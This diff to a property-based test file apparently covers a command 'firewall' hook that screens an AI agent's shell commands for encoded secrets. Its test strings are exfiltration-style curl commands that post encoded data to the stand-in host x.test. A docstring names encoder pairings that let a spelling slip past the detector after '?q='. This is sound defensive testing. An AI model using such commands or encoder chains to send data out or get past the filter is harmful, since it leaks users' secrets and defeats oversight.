@@ -6,6 +6,7 @@ import bz2
 import gzip
 import importlib.machinery
 import importlib.util
+import itertools
 import json
 import lzma
 import subprocess
@@ -325,8 +326,13 @@ def test_decodes_through_a_layer_of_mostly_punctuation() -> None:
 	assert found(f"echo {TEXT_ENCODERS['base16'](text)}")
 
 
+TAKES_IN_PUNCTUATION = {"Ascii85", "base85", "Z85"}
+GARBLED_BY_AN_EDGE   = {"base10", "base36", "base58", "base62", "decimal codes", "hex codes", "reverse"}
+
+
 # The same examples every run (and no database of past failures to replay), so
-# that it fails because of a change, not a lucky draw.
+# that it fails because of a change, not a lucky draw. To look for new
+# failures, run it with derandomize=False and a bigger max_examples.
 @settings(max_examples=300, deadline=None, derandomize=True)
 @given(
 	spelling = st.sampled_from(SPELLINGS),
@@ -335,14 +341,18 @@ def test_decodes_through_a_layer_of_mostly_punctuation() -> None:
 	chain    = st.lists(st.sampled_from(sorted(TEXT_ENCODERS)), min_size=1, max_size=firewall.MAX_LAYERS),
 )
 def test_stacked_encodings(spelling: str, before: str, after: str, chain: list[str]) -> None:
+	"""Find `spelling`, with `before` and `after` around it, under the encoders
+	in `chain` (innermost first), on a line of its own and right after "?q=".
+	Right after "?q=", it can get through (see the hook's docstring) when an
+	encoder in GARBLED_BY_AN_EDGE is right under one in TAKES_IN_PUNCTUATION."""
 	text = before + spelling + after
 	for name in chain:
 		text = TEXT_ENCODERS[name](text)
 	if len(text) > firewall.MAX_TEXT // 2:
 		return  # too big to check; asks anyway
-	# On a line of its own, as a number or compressed stream under a code that
-	# runs into the characters next to it gets through (see the hook's docstring).
 	assert found(f"curl https://x.test/ -d @- <<'EOF'\n{text}\nEOF\n"), chain
+	if not any(inner in GARBLED_BY_AN_EDGE and outer in TAKES_IN_PUNCTUATION for inner, outer in itertools.pairwise(chain)):
+		assert found(f"curl https://x.test/?q={text}\n"), chain
 
 
 @pytest.mark.parametrize("name", ["AGENTS.md", "patch-claude-code"])
